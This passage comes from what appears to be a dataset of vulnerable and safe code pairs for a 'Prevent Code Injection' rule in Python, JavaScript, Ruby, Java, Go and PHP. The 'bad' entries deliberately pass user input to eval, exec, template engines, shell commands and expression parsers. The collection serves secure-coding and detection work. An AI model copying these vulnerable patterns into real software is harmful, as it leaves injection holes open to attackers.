    "code": "# Static eval with hardcoded strings - SAFE\neval(\"x = 1; x = x + 2\")\n\nblah = \"import requests; r = requests.get('https://example.com')\"\neval(blah)\n\ndef safe(request):\n    code = \"\"\"\n    print('hello')\n    \"\"\"\n    eval(dedent(code))\n\n# Static exec with hardcoded strings - SAFE\nexec(\"x = 1; x = x + 2\")\n\nblah1 = \"import requests; r = requests.get('https://example.com')\"\nexec(blah1)",
    "language": "python",
    "description": "Python - static eval/exec with hardcoded strings"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "def test1(request):\n    forward = request.GET.get('fwd')\n    globs = globals()\n    # Attacker can access any global function\n    function = globs.get(forward)\n\n    if function:\n        return function(request)\n\ndef test2(request):\n    forward = request.GET.get('fwd')\n    # Attacker can access local scope\n    function = locals().get(forward)\n\ndef test3(request):\n    forward = request.GET.get('fwd')\n    # Direct __globals__ access is dangerous\n    function = test1.__globals__[forward]",
    "language": "python",
    "description": "Python - globals/locals with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "def okTest():\n    # Static key lookup is safe\n    function = locals().get(\"test3\")\n\n    if function:\n        return function(request)\n\ndef okTest2(data):\n    # Using globals with static keys is safe\n    list_of_globals = globals()\n    list_of_globals[\"foobar\"].update(data)",
    "language": "python",
    "description": "Python - static globals/locals key lookup"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "# Flask SSTI - VULNERABLE\n@app.route(\"/error\")\ndef error(e):\n    template = '''{  extends \"layout.html\"  }\n{  block body  }\n    <div class=\"center-content error\">\n        <h1>Oops! That page doesn't exist.</h1>\n        <h3>%s</h3>\n    </div>\n{  endblock  }\n'''.format(request.url)\n    return flask.render_template_string(template), 404\n\n# Using locals()/globals() as template context - VULNERABLE\ndef bad1(request):\n    response = render(request, 'vulnerable/xss/form.html', locals())\n    return response\n\ndef bad2(request, path='default'):\n    env = globals()\n    return render(request, 'vulnerable/xss/path.html', env)",
    "language": "python",
    "description": "Python - Flask/Django template injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "# Pass specific variables, not entire scope - SAFE\ndef file_access(request):\n    msg = request.GET.get('msg', '')\n    return render(request, 'vulnerable/injection/file_access.html',\n            {'msg': msg})",
    "language": "python",
    "description": "Python - passing specific variables to templates"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "def handler(event, context):\n    dynamic1 = \"import requests; r = requests.get('{}')\"\n    # User-controlled event data in exec - VULNERABLE\n    exec(dynamic1.format(event['url']))\n\n    dynamic2 = \"import requests; r = requests.get('{}')\"\n    # User-controlled event data in eval - VULNERABLE\n    eval(dynamic2.format(event['url']))",
    "language": "python",
    "description": "Python - AWS Lambda code execution"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "def handler(event, context):\n    # Static strings are safe\n    exec(\"x = 1; x = x + 2\")\n\n    blah1 = \"import requests; r = requests.get('https://example.com')\"\n    exec(blah1)",
    "language": "python",
    "description": "Python - AWS Lambda with static strings"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "let dynamic = window.prompt() // arbitrary user input\n\n// Dynamic content in eval - VULNERABLE\neval(dynamic + 'possibly malicious code');\n\neval(`${dynamic} possibly malicious code`);\n\neval(dynamic.concat(''));\n\nfunction evalSomething(something) {\n    eval(something);\n}\n\n// Template literals with user input - VULNERABLE\nwindow.eval(`alert('${location.href}')`)\n\nlet funcName = new URLSearchParams(window.location.search).get('a')\nvar x = new Function(`return ${funcName}(a,b)`)",
    "language": "javascript",
    "description": "JavaScript - browser eval with dynamic content"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "// Static strings are safe\neval('var x = \"static strings are okay\";');\n\nconst constVar = \"function staticStrings() { return 'static strings are okay';}\";\neval(constVar);\n\n// Concatenating constants is safe\neval(`${constVar}`);\n\nconst secondConstVar = 'this is a const variable';\neval(constVar + secondConstVar);",
    "language": "javascript",
    "description": "JavaScript - static eval strings"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "function test1(req,res) {\n  const data = JSON.stringify(req.query.key);\n  const command = `(secret) => {${data}}`\n  // Request data flows to eval - VULNERABLE\n  return eval(command)\n}\n\ntest2.post(foo, bar, function (req,res) {\n  userInput = req.params.input\n  var command = \"new Function('\"+userInput+\"')\";\n  return eval(command)\n});",
    "language": "javascript",
    "description": "JavaScript - Express request data in eval"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "function ok1(req,res) {\n  var command = \"eval('123')\";\n  // Static command is safe\n  return eval(command)\n}",
    "language": "javascript",
    "description": "JavaScript - static command in eval"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "function test1(data) {\n  const message = JSON.parse(data);\n  // Attacker controls which function is called - VULNERABLE\n  window[message.name](message.payload);\n}\n\nfunction test2(data) {\n  const message = JSON.parse(data);\n  const action = window[message.name];\n  action(message.payload);\n}",
    "language": "javascript",
    "description": "JavaScript - unsafe dynamic method invocation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "let api = {\n  foo: function () { /* do smth */ },\n  bar: function () { /* do smth */ }\n}\n\nfunction okTest1(data) {\n  const message = JSON.parse(data);\n  // Whitelist check before dynamic call - SAFE\n  if (!api.hasOwnProperty(message.name)) {\n    return;\n  }\n  api[message.name](message.payload);\n}\n\nfunction okTest2(data) {\n  // Static property access is safe\n  const result = api[\"foo\"](data);\n}",
    "language": "javascript",
    "description": "JavaScript - whitelist check before dynamic call"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "function dynamicRequire1(packageName) {\n    // User controls which module is loaded - VULNERABLE\n    var a = require(packageName)\n    return a;\n}\n\nfunction dynamicRequire2(source, file) {\n    require(path.resolve(process.cwd(), file, source));\n}",
    "language": "javascript",
    "description": "JavaScript - non-literal require"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "function okDynamicRequire4(userInput) {\n    // Static string is safe\n    var a = require('b')\n}\n\nfunction okDynamicRequire5(userInput) {\n    // Environment variables are generally safe\n    var a = require(process.env.VAR)\n}",
    "language": "javascript",
    "description": "JavaScript - static require"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "const vm = require('vm')\n\nexports.handler = async (event) => {\n    var input = event['something']\n    var sandbox = {\n        foo: input\n    }\n    // Tainted sandbox - VULNERABLE\n    vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n\n    const code = `\n        var x = ${event['something']};\n    `\n    // Tainted code - VULNERABLE\n    vm.runInThisContext(code)\n\n    // Tainted script - VULNERABLE\n    const script = new vm.Script(`\n        function add(a, b) {\n          return a + ${event['something']};\n        }\n    `);\n    script.runInThisContext();\n}",
    "language": "javascript",
    "description": "JavaScript - Node.js VM module injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "const vm = require('vm')\n\nexports.handler = async (event) => {\n    // Static sandbox - SAFE\n    var sandbox2 = {\n        foo: 1\n    }\n    vm.createContext(sandbox2)\n    vm.runInContext('safeEval(orderLinesData)', sandbox2, { timeout: 2000 })\n\n    const code2 = `\n        var x = 1;\n    `\n    // Static code - SAFE\n    vm.runInThisContext(code2)\n\n    // Static script - SAFE\n    const script1 = new vm.Script(`\n        function add(a, b) {\n          return a + b;\n        }\n    `);\n    script1.runInThisContext();\n}",
    "language": "javascript",
    "description": "JavaScript - static VM sandbox and code"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "const {VM, NodeVM} = require('vm2');\n\nasync function test1(code, input) {\n  code = `\n    console.log(${input})\n  `;\n\n  // Tainted code in VM - VULNERABLE\n  return new VM({\n    timeout: 40 * 1000,\n    sandbox\n  }).run(code);\n}\n\nfunction test2(input) {\n  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});\n  // String concatenation with input - VULNERABLE\n  return nodeVM.run('console.log(' + input + ')')\n}\n\n// Tainted sandbox - VULNERABLE\nasync function test1(input) {\n  const sandbox = {\n    setTimeout,\n    watch: input\n  };\n\n  return new VM({timeout: 40 * 1000, sandbox}).run(code);\n}",
    "language": "javascript",
    "description": "JavaScript - vm2 sandbox injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "const {VM, NodeVM} = require('vm2');\n\nasync function okTest1(code) {\n  code = `\n    console.log(\"Hello world\")\n  `;\n\n  // Static code - SAFE\n  return new VM({\n    timeout: 40 * 1000,\n    sandbox\n  }).run(code);\n}\n\nfunction okTest2() {\n  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});\n  // Static string - SAFE\n  return nodeVM.run('console.log(\"Hello world\")')\n}",
    "language": "javascript",
    "description": "JavaScript - static vm2 code"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "app.get('/', function(req, res) {\n    let tainted = req.query.id;\n\n    // User data in template compilation - VULNERABLE\n    pug.compile(tainted);\n    pug.render(tainted);\n    jade.compile(tainted);\n    jade.render(tainted);\n    dot.template(tainted);\n    ejs.render(tainted);\n    nunjucks.renderString(tainted);\n    lodash.template(tainted);\n    dot.compile(tainted);\n    handlebars.compile(req.query.id);\n    mustache.render(req.body._);\n    Hogan.compile(tainted);\n    Eta.render(tainted);\n    Sqrl.render(tainted);\n});",
    "language": "javascript",
    "description": "JavaScript - Express template injection SSTI"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "exports.handler = async (event) => {\n    // Event data in eval - VULNERABLE\n    eval(event['smth'])\n\n    var x = new Function('a', 'b', `return ${event['func']}(a,b)`)\n\n    var y = Function('a', 'b', event['code'])\n}",
    "language": "javascript",
    "description": "JavaScript - AWS Lambda eval injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "exports.handler = async (event) => {\n    // Static eval is safe\n    eval('alert')\n}",
    "language": "javascript",
    "description": "JavaScript - AWS Lambda static eval"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "# Tainted cookie in eval - VULNERABLE\nArray.class_eval(cookies['tainted_cookie'])\n\nb = params['something']\n# User input in module_eval - VULNERABLE\nThing.module_eval(b)\n\n# Direct param access - VULNERABLE\neval(b)\neval(b,some_binding)\neval(params['cmd'],b)\neval(params.dig('cmd'))\neval(cookies.delete('foo'))\n\n# Dynamic RubyVM compilation - VULNERABLE\nRubyVM::InstructionSequence.compile(foo).eval\n\niseq = RubyVM::InstructionSequence.compile(foo)\niseq.eval",
    "language": "ruby",
    "description": "Ruby - dangerous eval"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "def zen\n  41\nend\n\n# Static eval is safe\neval(\"def zen; 42; end\")\n\nclass Thing\nend\na = %q{def hello() \"Hello there!\" end}\n# Not user-controllable, this is safe\nThing.module_eval(a)\n\ndef get_binding(param)\n  binding\nend\nb = get_binding(\"hello\")\n# Static function call is safe\nb.eval(\"some_func\")\n\neval(\"some_func\",b)\n\n# Static RubyVM compilation is safe\nRubyVM::InstructionSequence.compile(\"1 + 2\").eval\n\niseq = RubyVM::InstructionSequence.compile('num = 1 + 2')\niseq.eval",
    "language": "ruby",
    "description": "Ruby - static eval"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "class HomeController < ApplicationController\n\n  def unsafe_reflection\n    table = params[\"table\"]\n    # User controls which class is instantiated - VULNERABLE\n    model = table.classify.constantize\n    @result = model.send(:method)\n  end\nend",
    "language": "ruby",
    "description": "Ruby - unsafe reflection with constantize"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "class HomeController < ApplicationController\n\n  def ok_reflection\n    foo = \"SomeClass\"\n    # Static string is safe\n    foo.classify.constantize\n  end\nend",
    "language": "ruby",
    "description": "Ruby - static string reflection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "class GroupsController < ApplicationController\n\n  def dynamic_method_invocations\n    # User input to to_proc - VULNERABLE\n    params[:method].to_sym.to_proc.call(Kernel)\n\n    # User input to method() - VULNERABLE\n    (params[:klass].to_s).method(params[:method]).(params[:argument])\n\n    # User input to tap - VULNERABLE\n    Kernel.tap(&params[:method].to_sym)\n\n    user_input_value = params[:my_user_input]\n    anything.tap(&user_input_value.to_sym)\n    anything_else.tap { |thing| thing + user_input_value() }\n  end\nend",
    "language": "ruby",
    "description": "Ruby - unsafe reflection with tap/method/to_proc"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "class GroupsController < ApplicationController\n\n  def dynamic_method_invocations_ok\n    # Static strings are safe\n    \"SomeClass\".to_sym.to_proc.call(Kernel)\n    SomeClass.method(\"some_method\").(\"some_argument\")\n    Kernel.tap(\"SomeClass\".to_sym)\n\n    user_input_value = params[:my_user_input]\n    # Calling method on user input (not with user input) is safe\n    user_input_value.tap(\"some_method\")\n  end\nend",
    "language": "ruby",
    "description": "Ruby - static strings in reflection methods"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "def bad_send\n    method = params[:method]\n    # User controls which method is called - VULNERABLE\n    @result = User.send(method.to_sym)\nend",
    "language": "ruby",
    "description": "Ruby - dangerous send with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "def ok_send\n    # Ternary ensures only known methods are called - SAFE\n    method = params[:method] == 1 ? :method_a : :method_b\n    @result = User.send(method, *args)\nend",
    "language": "ruby",
    "description": "Ruby - validated send with ternary"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "def test_params()\n  user_input = params['some_key']\n\n  # String interpolation with user input - VULNERABLE\n  exec(\"ls -lah #{user_input}\")\n  Process.spawn([user_input, \"smth\"])\n  output = exec([\"sh\", \"-c\", user_input])\n  pid = spawn([\"bash\", user_input])\nend\n\ndef test_cookies()\n  user_input = cookies['some_cookie']\n  exec(\"ls -lah #{user_input}\")\nend",
    "language": "ruby",
    "description": "Ruby - dangerous exec/spawn/system"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "def test_params()\n  commands = \"ls -lah /raz/dva\"\n  # Static commands are safe\n  system(commands)\n\n  cmd_name = \"sh\"\n  Process.exec([cmd_name, \"ls\", \"-la\"])\n  Open3.capture2({\"FOO\" => \"BAR\"}, [cmd_name, \"smth\"])\n  system(\"ls -lah /tmp\")\n  exec([\"ls\", \"-lah\", \"/tmp\"])\nend",
    "language": "ruby",
    "description": "Ruby - static exec/spawn/system commands"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "def test_calls(user_input)\n  # Backticks with interpolation - VULNERABLE\n  result = `foo #{user_input} bar`\n  result2 = %x{foo #{user_input} bar}\n  cmd = `foo #{user_input} bar #{smth_else}`\nend",
    "language": "ruby",
    "description": "Ruby - dangerous subshell with interpolation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "def test_calls(user_input)\n  # Static commands are safe\n  smth = `ls testdir`.split[1]\n  ok_cmd = `echo oops && exit 99`\n\n  hardcode = \"testdir\"\n  ok_cmd2 = %{ls #{hardcode} -lah}\nend",
    "language": "ruby",
    "description": "Ruby - static subshell commands"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "class Bad_cookie_serialization\n  # Marshal deserialization is dangerous - VULNERABLE\n  Rails.application.config.action_dispatch.cookies_serializer = :hybrid\n  Rails.application.config.action_dispatch.cookies_serializer = :marshal\nend",
    "language": "ruby",
    "description": "Ruby - Marshal cookie serialization"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "class Cookie_serialization\n  # JSON serialization is safe\n  Rails.application.config.action_dispatch.cookies_serializer = :json\nend",
    "language": "ruby",
    "description": "Ruby - JSON cookie serialization"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "public class ScriptEngineSample {\n\n    private static ScriptEngineManager sem = new ScriptEngineManager();\n    private static ScriptEngine se = sem.getEngineByExtension(\"js\");\n\n    // User input in script evaluation - VULNERABLE\n    public static void scripting(String userInput) throws ScriptException {\n        Object result = se.eval(\"test=1;\" + userInput);\n    }\n\n    public static void scripting1(String userInput) throws ScriptException {\n        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();\n        ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension(\"js\");\n        Object result = scriptEngine.eval(\"test=1;\" + userInput);\n    }\n}",
    "language": "java",
    "description": "Java - ScriptEngine injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "public class ScriptEngineSample {\n\n    // Static script is safe\n    public static void scriptingSafe() throws ScriptException {\n        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();\n        ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension(\"js\");\n        String code = \"var test=3;test=test*2;\";\n        Object result = scriptEngine.eval(code);\n    }\n}",
    "language": "java",
    "description": "Java - static ScriptEngine evaluation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "public class SpelSample {\n\n    // User input in SpEL expression - VULNERABLE\n    public static void parseExpressionInterface1(String property) {\n        ExpressionParser parser = new SpelExpressionParser();\n        StandardEvaluationContext testContext = new StandardEvaluationContext(TEST_PERSON);\n        Expression exp2 = parser.parseExpression(property+\" == 'Benoit'\");\n        String dynamicValue = exp2.getValue(testContext, String.class);\n    }\n\n    public static void parseSpelExpression3(String property) {\n        SpelExpressionParser parser = new SpelExpressionParser();\n        StandardEvaluationContext testContext = new StandardEvaluationContext(TEST_PERSON);\n        Expression exp2 = parser.parseExpression(property+\" == 'Benoit'\");\n    }\n}",
    "language": "java",
    "description": "Java - Spring Expression Language SpEL injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "public class SpelSample {\n\n    // Static expression is safe\n    public static void parseExpressionInterface2(String property) {\n        ExpressionParser parser = new SpelExpressionParser();\n        Expression exp1 = parser.parseExpression(\"'safe expression'\");\n        String constantValue = exp1.getValue(String.class);\n    }\n}",
    "language": "java",
    "description": "Java - static SpEL expression"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "public class OgnlReflectionProviderSample {\n\n    // User input in OGNL - VULNERABLE\n    public void unsafeOgnlReflectionProvider(String input, OgnlReflectionProvider reflectionProvider, Class type) {\n        reflectionProvider.getGetMethod(type, input);\n    }\n\n    public void unsafeOgnlReflectionProvider1(String input, ReflectionProvider reflectionProvider) {\n        reflectionProvider.getValue(input, null, null);\n    }\n\n    public void unsafeOgnlReflectionProvider3(String input, OgnlTextParser reflectionProvider) {\n        reflectionProvider.evaluate( input );\n    }\n}",
    "language": "java",
    "description": "Java - OGNL injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "public class OgnlReflectionProviderSample {\n\n    // Static input is safe\n    public void safeOgnlReflectionProvider1(OgnlReflectionProvider reflectionProvider, Class type) {\n        String input = \"thisissafe\";\n        reflectionProvider.getGetMethod(type, input);\n    }\n\n    public void safeOgnlReflectionProvider2(OgnlReflectionProvider reflectionProvider, Class type) {\n        reflectionProvider.getField(type, \"thisissafe\");\n    }\n}",
    "language": "java",
    "description": "Java - static OGNL input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "public class ElExpressionSample {\n\n    // User input in EL expression - VULNERABLE\n    public void unsafeEL(String expression) {\n        FacesContext context = FacesContext.getCurrentInstance();\n        ExpressionFactory expressionFactory = context.getApplication().getExpressionFactory();\n        ELContext elContext = context.getELContext();\n        ValueExpression vex = expressionFactory.createValueExpression(elContext, expression, String.class);\n        String result = (String) vex.getValue(elContext);\n    }\n\n    public void unsafeELMethod(ELContext elContext, ExpressionFactory expressionFactory, String expression) {\n        expressionFactory.createMethodExpression(elContext, expression, String.class, new Class[]{Integer.class});\n    }\n\n    private void unsafeELTemplate(String message, ConstraintValidatorContext context) {\n         context.disableDefaultConstraintViolation();\n         context\n             .someMethod()\n             .buildConstraintViolationWithTemplate(message)\n             .addConstraintViolation();\n    }\n}",
    "language": "java",
    "description": "Java - Expression Language EL injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "public class ElExpressionSample {\n\n    // Static expression is safe\n    public void safeEL() {\n        FacesContext context = FacesContext.getCurrentInstance();\n        ExpressionFactory expressionFactory = context.getApplication().getExpressionFactory();\n        ELContext elContext = context.getELContext();\n        ValueExpression vex = expressionFactory.createValueExpression(elContext, \"1+1\", String.class);\n        String result = (String) vex.getValue(elContext);\n    }\n\n    private void safeELTemplate(String message, ConstraintValidatorContext context) {\n         context.disableDefaultConstraintViolation();\n         context\n             .someMethod()\n             .buildConstraintViolationWithTemplate(\"somestring\")\n             .addConstraintViolation();\n    }\n}",
    "language": "java",
    "description": "Java - static EL expression"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "public class GroovyShellUsage {\n\n    public static void test1(String uri, String file, String script) {\n        GroovyShell shell = new GroovyShell();\n\n        // User input in evaluate - VULNERABLE\n        shell.evaluate(new File(file));\n        shell.evaluate(new InputStreamReader(new FileInputStream(file)), \"script1.groovy\");\n        shell.evaluate(script);\n        shell.evaluate(script, \"script1.groovy\", \"test\");\n        shell.evaluate(new URI(uri));\n    }\n\n    public static void test2(String uri, String file, String script) {\n        GroovyShell shell = new GroovyShell();\n\n        // User input in parse - VULNERABLE\n        shell.parse(new File(file));\n        shell.parse(script);\n        shell.parse(new URI(uri));\n    }\n\n    public static void test3(String script, ClassLoader loader) {\n        GroovyClassLoader groovyLoader = (GroovyClassLoader) loader;\n\n        // User input in parseClass - VULNERABLE\n        groovyLoader.parseClass(script);\n        groovyLoader.parseClass(script,\"test.groovy\");\n    }\n}",
    "language": "java",
    "description": "Java - Groovy shell injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "public class GroovyShellUsage {\n\n    public static void test1() {\n        GroovyShell shell = new GroovyShell();\n        // Static script is safe\n        shell.evaluate(\"hardcoded script\");\n    }\n\n    public static void test2() {\n        GroovyShell shell = new GroovyShell();\n        String hardcodedScript = \"test.groovy\";\n        // Hardcoded path is safe\n        shell.parse(hardcodedScript);\n    }\n}",
    "language": "java",
    "description": "Java - static Groovy shell scripts"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "public class HttpRequestDebugFilter implements Filter {\n    Log log = Logging.getLog(HttpRequestDebugFilter.class);\n\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {\n        if (request instanceof HttpServletRequest) {\n            HttpServletRequest httpRequest = (HttpServletRequest)request;\n            // String concatenation in log - VULNERABLE (EL evaluation)\n            log.info(\"request: method=\"+httpRequest.getMethod()+\", URL=\"+httpRequest.getRequestURI());\n        }\n    }\n\n    public void logUser(User user) {\n        // User data in string concatenation - VULNERABLE\n        log.info(\"Current logged in user : \" + user.getUsername());\n    }\n}",
    "language": "java",
    "description": "Java - Seam log injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "public class HttpRequestDebugFilter implements Filter {\n    Log log = Logging.getLog(HttpRequestDebugFilter.class);\n\n    public void logUser(User user) {\n        // Parameterized logging prevents EL injection - SAFE\n        log.info(\"Current logged in user : #0\", user.getUsername());\n    }\n}",
    "language": "java",
    "description": "Java - parameterized Seam logging"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "func runCommand1(userInput string) {\n    // User controls command - VULNERABLE\n    cmd := exec.Command(userInput, \"foobar\")\n    cmd.Run()\n}\n\nfunc runCommand2(userInput string) {\n    execPath, _ := exec.LookPath(userInput)\n    // User controls path lookup - VULNERABLE\n    cmd := exec.Command(execPath, \"foobar\")\n    cmd.Run()\n}\n\nfunc runCommand4(userInput string) {\n    // User input passed to shell - VULNERABLE\n    cmd := exec.Command(\"bash\", \"-c\", userInput)\n    cmd.Run()\n}\n\nfunc runcommand5(s string) (string, error) {\n    // Function parameter in shell command - VULNERABLE\n    cmd := exec.Command(\"/usr/bin/env\", \"bash\", \"-c\", s)\n    return cmd.CombinedOutput()\n}",
    "language": "go",
    "description": "Go - dangerous exec.Command with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "func okCommand1(userInput string) {\n    goExec, _ := exec.LookPath(\"go\")\n    // Static command is safe\n    cmd := exec.Command(goExec, \"version\")\n    cmd.Run()\n}\n\nfunc okCommand2(userInput string) {\n    // Static command is safe\n    cmd := exec.Command(\"go\", \"version\")\n    cmd.Run()\n}\n\nfunc okCommand3(s string) (string, error) {\n    someCommand := \"w\"\n    // Hardcoded command is safe\n    cmd := exec.Command(\"/usr/bin/env\", \"bash\", \"-c\", someCommand)\n    return cmd.CombinedOutput()\n}",
    "language": "go",
    "description": "Go - static exec.Command"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "func test1(userInput string) {\n    cmdPath,_ := userInput;\n\n    // User controls Path - VULNERABLE\n    cmd := &exec.Cmd {\n        Path: cmdPath,\n        Args: []string{ \"foo\", \"bar\" },\n    }\n    cmd.Start();\n}\n\nfunc test3(userInput string) {\n    cmdPath,_ := exec.LookPath(\"bash\");\n\n    // User controls Args - VULNERABLE\n    cmd := &exec.Cmd {\n        Path: cmdPath,\n        Args: []string{ cmdPath, \"-c\", userInput },\n    }\n    cmd.Start();\n}",
    "language": "go",
    "description": "Go - dangerous exec.Cmd struct with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "func okTest1(userInput string) {\n    cmdPath,_ := exec.LookPath(\"go\");\n\n    // Static path and args are safe\n    cmd := &exec.Cmd {\n        Path: cmdPath,\n        Args: []string{ cmdPath, \"bar\" },\n    }\n    cmd.Start();\n}",
    "language": "go",
    "description": "Go - static exec.Cmd struct"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "func test1(userInput string) {\n    // User controls binary path - VULNERABLE\n    binary, _ := exec.LookPath(userInput)\n    args := []string{\"ls\", \"-a\", \"-l\", \"-h\"}\n    env := os.Environ()\n    syscall.Exec(binary, args, env)\n}\n\nfunc test2(userInput string) {\n    binary, _ := exec.LookPath(\"sh\")\n    // User controls args - VULNERABLE\n    args := []string{userInput, \"-a\", \"-l\", \"-h\"}\n    syscall.Exec(binary, args, env)\n}\n\nfunc test3(userInput string) {\n    binary, _ := exec.LookPath(\"sh\")\n    // User input passed to shell - VULNERABLE\n    args := []string{binary, \"-c\", userInput}\n    syscall.Exec(binary, args, env)\n}",
    "language": "go",
    "description": "Go - dangerous syscall.Exec with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "func okTest1(userInput string) {\n    // Static command is safe\n    binary, _ := exec.LookPath(\"ls\")\n    args := []string{\"ls\", \"-a\", \"-l\", \"-h\"}\n    env := os.Environ()\n    syscall.Exec(binary, args, env)\n}",
    "language": "go",
    "description": "Go - static syscall.Exec"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "func whyyyy(w http.ResponseWriter, r *http.Request) {\n    r.ParseForm()\n    script := r.Form.Get(\"script\")\n\n    vm := otto.New()\n\n    // User script in VM - VULNERABLE\n    vm.Run(script)\n}",
    "language": "go",
    "description": "Go - Otto VM injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "func main() {\n    vm := otto.New()\n    // Static script is safe\n    vm.Run(`\n        abc = 2 + 2;\n        console.log(\"The value of abc is \" + abc);\n    `)\n}",
    "language": "go",
    "description": "Go - static Otto VM script"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "// User input in exec - VULNERABLE\nexec($user_input);\npassthru($user_input);\n$proc = proc_open($cmd, $descriptorspec, $pipes);\n$handle = popen($user_input, \"r\");\n$output = shell_exec($user_input);\n$output = system($user_input, $retval);\npcntl_exec($path);\n\n// Tainted exec - VULNERABLE\n$username = $_COOKIE['username'];\nexec(\"wto -n \\\"$username\\\" -g\", $ret);\n\n$jobName = $_REQUEST['jobName'];\n$cmd = sprintf(\"rsyncmd -l \\\"$xmlPath\\\" -r %s >/dev/null\", $jobName);\nsystem($cmd);",
    "language": "php",
    "description": "PHP - dangerous exec functions with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
